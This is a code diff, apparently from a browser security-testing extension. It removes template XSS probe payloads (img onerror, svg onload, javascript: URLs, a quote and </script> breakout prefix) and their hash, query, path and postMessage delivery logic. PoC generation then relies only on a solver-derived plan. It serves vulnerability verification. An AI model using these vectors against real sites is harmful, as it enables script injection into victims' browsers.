@@ -7004,93 +7004,6 @@ async function handlePopupMessage(msg, _sender, sendResponse) {
  */
 // ─── Exploit probe (interactive per-finding verification) ─────────────────
 
-// Construct the active payload that proves EXECUTION (not just taint reach).
-// Every vector calls `apiclientsink("<id>")` — intercept.js's always-installed
-// beacon — with the finding's crypto.randomUUID. A call means the browser
-// ACTUALLY ran the payload through its pipeline (HTML parser → event handler,
-// eval, javascript: navigation); the id is relayed (intercept.js → content.js →
-// offscreen) and correlated to this session. The id lives INSIDE the payload,
-// never in the URL. CSP-correct: if CSP blocks the handler, apiclientsink is
-// never called → honestly NOT REPRODUCED.
-function _probePayloads(marker) {
-  // marker is a crypto.randomUUID — `[0-9a-f-]`, safe inside a double-quoted JS
-  // string literal with no escaping.
-  const call = 'apiclientsink("' + marker + '")';
-  return {
-    // html: <img> whose failed load fires onerror (DOM-XSS via innerHTML/write).
-    html: '<img src=x onerror=\'' + call + '\'>',
-    // js: bare statement for eval() / new Function() / setTimeout(string) sinks.
-    js: call,
-    // href: javascript: URL for location.href / src / href-attribute sinks.
-    href: 'javascript:' + call + '//',
-    // svg: alternate HTML vector — some sanitizers strip <img> but miss <svg>.
-    svg: '<svg onload=\'' + call + '\'></svg>',
-  };
-}
-
-function _buildProbeUrl(pageUrl, strategy, marker, opts) {
-  const u = new URL(pageUrl);
-  const pl = _probePayloads(marker);
-  // Payload shape depends on sink semantics. The same string cannot
-  // simultaneously be valid HTML-for-innerHTML AND valid JS-for-eval —
-  // so we pick per sink type:
-  //   eval / Function sinks → pl.js (valid JS statement sets flag.js)
-  //   redirect sinks (location.*, window.open) → pl.href (javascript: URL)
-  //   xss / DOM sinks / default → pl.html + pl.svg + pl.dom (HTML vectors)
-  // If sinkType is unknown, default to HTML (covers innerHTML/writeLn/
-  // setAttribute — the most common sink family).
-  const sinkType = opts && opts.sinkType;
-  const sinkName = opts && opts.sinkName;
-  // Pick payload shape from how the sink executes attacker content:
-  //   eval()/Function()           → pl.js (JS statement)
-  //   location.href /.assign, etc.→ pl.href (javascript: URL navigation)
-  //   href/src/action attributes  → pl.href (javascript: URL; the HTML
-  //                                 payload wouldn't change scheme)
-  //   innerHTML/write/append etc. → pl.html+svg+dom (HTML parsing)
-  //   unknown xss                 → default to HTML (common case)
-  const isUrlAttrSink = sinkType === "xss" && typeof sinkName === "string" && (
-    sinkName === "href" || sinkName === "src" || sinkName === "action" ||
-    sinkName === "formaction" ||
-    sinkName === "setAttribute:href" || sinkName === "setAttribute:src" ||
-    sinkName === "setAttribute:action" || sinkName === "setAttribute:formaction"
-  );
-  let activePayload;
-  if (sinkType === "eval") {
-    activePayload = pl.js;
-  } else if (sinkType === "redirect" || isUrlAttrSink) {
-    activePayload = pl.href;
-  } else {
-    // HTML payload: prefix with a parse-state-reset sequence so the
-    // active <img>/<svg> elements escape the most common embedding
-    // contexts and render as siblings. The three chars + `</script>`:
-    //   "   — closes a double-quoted attribute value
-    //   '   — closes a single-quoted attribute value
-    //   >   — ends the enclosing start-tag
-    //   </script>  — exits raw-text state inside <script src="…">
-    //              (needed for document.write('<script src="'+x+'">'))
-    // In pure-body contexts these leading chars render as text and do
-    // no harm; <img>/<svg> still parse. This is a PARSING FACT about
-    // HTML, not a heuristic about sinks.
-    activePayload = '"\'></script>' + pl.html + pl.svg;
-  }
-  // The URL carries ONLY the genuine attacker payload (which itself contains the
-  // apiclientsink(<id>) call that correlates the hit) — NEVER a separate marker
-  // token. A hash is not sent to the server, so it must not influence analysis.
-  if (strategy === "hash" || strategy === "postmessage") {
-    u.hash = "#" + encodeURIComponent(activePayload);
-  } else if (strategy === "search") {
-    // The caller MUST supply the param name the finding observed the page
-    // reading. We never guess a key — the finding already knows which name its
-    // sink traced back to; the caller derives it from the finding.
-    if (!opts || !opts.paramName) {
-      throw new Error("search strategy requires opts.paramName — the query key the finding observed the page reading");
-    }
-    u.searchParams.set(opts.paramName, activePayload);
-  } else if (strategy === "pathname") {
-    u.pathname = u.pathname.replace(/\/?$/, "/") + encodeURIComponent(activePayload);
-  }
-  return u.href;
-}
 
 // The real cross-origin attacker origin the PoC runs on. A minimal, stable,
 // CSP-free page (IANA's reserved example domain) so the injected PoC can frame
@@ -7098,65 +7011,6 @@ function _buildProbeUrl(pageUrl, strategy, marker, opts) {
 // is what a researcher would paste the PoC onto.
 const PROBE_ATTACKER_ORIGIN = "https://example.com/";
 
-// Build the structured-clone payload a postMessage PoC delivers to the framed
-// target: the active vectors shaped to the handler's observed field path, with
-// AST-extracted preconditions merged and the source's decoder chain pre-applied
-// in reverse. Extracted so the PoC-JS builder and any caller share one shaping.
-function _shapePostMessagePayload(marker, opts) {
-  opts = opts || {};
-  const payloads = _probePayloads(marker);
-  let activeStr;
-  if (opts.sinkType === "eval") activeStr = payloads.js + "/*" + marker + "*/";
-  else if (opts.sinkType === "redirect") activeStr = payloads.href;
-  else activeStr = '"\'></script>' + payloads.html + payloads.svg;
-  let shaped = activeStr;
-  const fieldPath = Array.isArray(opts.fieldPath) ? opts.fieldPath : [];
-  for (let i = fieldPath.length - 1; i >= 0; i--) shaped = { [fieldPath[i]]: shaped };
-  const precs = Array.isArray(opts.preconditions) ? opts.preconditions : [];
-  for (const p of precs) {
-    if (!p || !Array.isArray(p.path) || p.op !== "===") continue;
-    if (typeof shaped !== "object" || shaped === null) shaped = { __apisec_root: shaped };
-    let cur = shaped;
-    for (let i = 0; i < p.path.length - 1; i++) {
-      const key = p.path[i];
-      if (typeof cur[key] !== "object" || cur[key] === null) cur[key] = {};
-      cur = cur[key];
-    }
-    if (p.path.length === 0) continue;
-    cur[p.path[p.path.length - 1]] = p.value;
-  }
-  if (shaped && typeof shaped === "object" && Object.keys(shaped).length === 1 &&
-      Object.prototype.hasOwnProperty.call(shaped, "__apisec_root")) {
-    shaped = shaped.__apisec_root;
-  }
-  const decs = Array.isArray(opts.decoders) ? opts.decoders : [];
-  for (let i = decs.length - 1; i >= 0; i--) {
-    const d = decs[i];
-    try {
-      if (d === "json") shaped = JSON.stringify(shaped);
-      else if (d === "escape") shaped = escape(String(shaped));
-      else if (d === "uri-component") shaped = encodeURIComponent(String(shaped));
-      else if (d === "uri") shaped = encodeURI(String(shaped));
-      else if (d === "base64") shaped = btoa(unescape(encodeURIComponent(String(shaped))));
-    } catch (e) {
-      console.warn("[brain] PoC pre-encode failed:", e && e.message || e, "decoder=" + d);
-    }
-  }
-  return shaped;
-}
-
-// THE single PoC artifact: the exact attacker JavaScript the UI displays AND the
-// Run button executes verbatim on PROBE_ATTACKER_ORIGIN. It frames (or frames +
-// postMessages) the target cross-origin; the target's OWN vulnerable code reads
-// the attacker input and reaches the sink inside the frame. `apiclientsink(...)`
-// is the instrumentation proof hook intercept.js arms from the __apisec marker
-// in the framed URL (runs at document_start in all frames); a researcher swaps
-// it for a real payload to demo live. Gesture-free by construction — iframe +
-// cross-origin postMessage need no user activation, unlike window.open (which
-// the popup blocker kills in an injected context, with no `debugger` permission
-// to synthesize a gesture). Targets that send X-Frame-Options / frame-ancestors
-// can't be framed; the PoC is still the honest attacker code and verification
-// honestly reports NOT REPRODUCED rather than faking it.
 // Compile a Z3 pocPlan into one self-contained attacker script handling complex
 // multi-step state: combined URL gates + an ORDERED postMessage sequence, with
 // the apiclientsink payload woven into the one sink-bearing field/event (other
@@ -7178,17 +7032,9 @@ function _buildPocJsFromPlan(pageUrl, marker, plan, opts) {
     }
     return v;
   }
-  // Fallback ONLY when no Z3-solved value is present on the sink field (e.g. the
-  // engine emitted no @P payload for it) — never overrides a solved value.
-  const fallback = (function () {
-    const pl = _probePayloads(marker);
-    if (opts.sinkType === "eval") return pl.js;
-    if (opts.sinkType === "redirect") return pl.href;
-    return '"\'></script>' + pl.html + pl.svg;
-  })();
-  // URL with the plan's gate components. The attacker controls hash/search/path
-  // the victim's URL carries; weave the active payload into the URL only when no
-  // event carries the sink (pure URL-source plan).
+  // NO template fallback: every value here is the Z3-solved value from the @P
+  // plan. If a field has no solved value we leave it as the plan emitted it —
+  // never fabricate a payload.
   function setByPath(obj, dotPath, val) {
     const parts = String(dotPath).split(".");
     let cur = obj;
@@ -7214,25 +7060,18 @@ function _buildPocJsFromPlan(pageUrl, marker, plan, opts) {
     if (plan.url && plan.url.pathname) url.pathname = plan.url.pathname;
     if (plan.url && plan.url.search) url.search = weaveProof(plan.url.search);
     if (plan.url && plan.url.hash) { const h = weaveProof(plan.url.hash); url.hash = h[0] === "#" ? h : "#" + h; }
-    if (!sinkEvent && !events.length && !(plan.url && (plan.url.hash || plan.url.search))) {
-      // No solved URL gate and no events — last-resort fallback vector.
-      url.hash = (url.hash ? url.hash + "&" : "#") + encodeURIComponent(fallback);
-    }
   }
   const targetUrl = url ? url.href : pageUrl;
   const builtEvents = events.map((e) => {
     let payload = (e.payload && typeof e.payload === "object") ? JSON.parse(JSON.stringify(e.payload)) : e.payload;
-    if (e.carriesPayload) {
-      if (e.payloadField) {
-        if (typeof payload !== "object" || payload === null) payload = {};
-        const solved = getByPath(payload, e.payloadField);
-        // USE the Z3-solved sink value (proof woven); fall back only if absent.
-        setByPath(payload, e.payloadField, solved != null ? weaveProof(solved) : fallback);
-      } else {
-        payload = (typeof payload === "string" && payload) ? weaveProof(payload) : fallback;
-      }
+    if (e.carriesPayload && e.payloadField) {
+      if (typeof payload !== "object" || payload === null) payload = {};
+      const solved = getByPath(payload, e.payloadField);
+      // ONLY the Z3-solved sink value (proof woven). No solved value ⇒ leave the
+      // plan's field untouched — never fabricate a template payload.
+      if (solved != null) setByPath(payload, e.payloadField, weaveProof(solved));
     } else if (typeof payload === "string") {
-      payload = weaveProof(payload);   // a gate field may itself be the solved exploit string
+      payload = weaveProof(payload);   // a field may itself be the solved exploit string
     }
     return payload;
   });
@@ -7267,49 +7106,24 @@ function _buildPocJsFromPlan(pageUrl, marker, plan, opts) {
 
 function _buildPocJs(pageUrl, marker, opts) {
   opts = opts || {};
-  const strategy = opts.strategy || "hash";
-  const header =
-    "// API-Client PoC — run on any attacker origin (e.g. https://example.com).\n" +
-    "// Opens the target in a real window with the attacker-controlled input; the\n" +
-    "// target's OWN code reads it and reaches the sink. apiclientsink(...) is the\n" +
-    "// proof hook (replace with e.g. alert(document.domain) to demonstrate live).\n" +
-    "// window.open needs a user gesture — clicking Run provides it.\n";
-  // COMPLEX-STATE path: a Z3 pocPlan with an ordered event sequence and/or
-  // combined URL gates compiles to ONE self-contained attacker script (open the
-  // target at the gated URL, then dispatch the postMessage sequence in order,
-  // weaving the apiclientsink payload into the sink-bearing field). Same single
-  // artifact — displayed AND executed.
+  // The PoC is compiled ONLY from the Z3 solve (the @P plan: solved values +
+  // channels + order). NO templates, no legacy strategy fallback. If there is no
+  // Z3 plan, there is NO PoC — `null` tells the caller not to offer one. (A
+  // proven REAL_EXPLOIT always carries a @P plan; an unproven/over-approx verdict
+  // never reaches here because the UI gates the PoC offer on REAL_EXPLOIT.)
   const plan = opts.pocPlan;
-  if (plan && ((Array.isArray(plan.events) && plan.events.length) ||
-               (plan.url && (plan.url.hash || plan.url.search || plan.url.pathname)))) {
-    return header + _buildPocJsFromPlan(pageUrl, marker, plan, opts);
+  if (!plan || !((Array.isArray(plan.events) && plan.events.length) ||
+                 (plan.url && (plan.url.hash || plan.url.search || plan.url.pathname)))) {
+    return null;
   }
-  if (strategy === "postmessage") {
-    // Marker in the opened URL arms intercept.js in the target so the sink
-    // wrappers + apiclientsink are present when the posted payload lands.
-    const targetUrl = _buildProbeUrl(pageUrl, "hash", marker, opts);
-    const shaped = _shapePostMessagePayload(marker, opts);
-    return header +
-      "(function () {\n" +
-      "  var TARGET = " + JSON.stringify(targetUrl) + ";\n" +
-      "  var DATA = " + JSON.stringify(shaped) + ";\n" +
-      "  var w = window.open(TARGET, '_blank');\n" +
-      "  if (!w) { alert('popup blocked — allow popups for this PoC'); return; }\n" +
-      "  [300, 1500, 3500].forEach(function (d) {\n" +
-      "    setTimeout(function () { try { w.postMessage(DATA, '*'); } catch (e) {} }, d);\n" +
-      "  });\n" +
-      "})();\n";
-  }
-  // URL-source strategies (hash / search / pathname): payload is in the opened
-  // URL; the page reads its own location and reaches the sink. We do NOT inspect
-  // window.open's return — from a sandboxed/cross-origin opener it returns null
-  // even on success (severed opener handle), so a null check would be a false
-  // "blocked" alarm. The navigation is what matters here, not the handle.
-  const targetUrl = _buildProbeUrl(pageUrl, strategy, marker, opts);
-  return header +
-    "(function () {\n" +
-    "  window.open(" + JSON.stringify(targetUrl) + ", '_blank');\n" +
-    "})();\n";
+  const header =
+    "// API-Client PoC — built from the Z3 solve over the page's real taint flow\n" +
+    "// (no template). Run on any attacker origin (e.g. https://example.com); the\n" +
+    "// target's OWN code reads the attacker-controlled input and reaches the sink.\n" +
+    "// apiclientsink(<finding-id>) is the proof hook (swap for e.g.\n" +
+    "// alert(document.domain) to demonstrate live). window.open needs a user\n" +
+    "// gesture — clicking Run provides it.\n";
+  return header + _buildPocJsFromPlan(pageUrl, marker, plan, opts);
 }
 
 // Sessions persist past completion so the popup can reopen after the
